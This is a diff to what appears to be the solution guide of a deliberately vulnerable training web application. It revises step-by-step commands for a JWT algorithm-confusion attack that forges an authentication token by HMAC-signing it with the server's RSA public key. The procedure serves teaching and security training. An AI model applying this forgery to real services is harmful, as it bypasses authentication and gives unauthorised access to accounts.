@@ -2601,7 +2601,7 @@ this solution.
 1. Download the application's public JWT key from
    <http://localhost:3000/encryptionkeys/jwt.pub>
 
-2. The authentication token is of form `{header_base64url}.{payload_base64url}.{signature_base64url}`.
+2. The authentication token is of form `header_base64url.payload_base64url.signature_base64url`.
 Copy the JWT header from a request, decode it and change the algorithm to HS256
 using a tool like https://cryptii.com/.  
 The server uses a private RSA key to sign the token
@@ -2617,10 +2617,11 @@ disregarding the algorithm specified in the header.
 4. Encode the server key to hex `cat jwt.pub | xxd -p | tr -d "\\n"`
 
 5. Sign your new token with the server key with hmac
-`echo -n "{new_header}.{new_payload}" | openssl dgst -sha256 -mac HMAC -macopt hexkey:{server_key}`
+`echo -n "new_header.new_payload" | openssl dgst -sha256 -mac HMAC -macopt hexkey:server_key_hex`
 
 6. Encode your signature to base64url:
-`echo "{signature}" | xxd -r -p | base64 |  sed 's/+/-/g; s/\//_/g';`
+`echo -n "signature" | xxd -r -p | base64 |  sed 's/+/-/g; s/\//_/g; s/=//g' | tr -d "\\n"`
+
 
 7. Place the new token in a cookie or send an authenticated request with the it to solve the challenge.
 
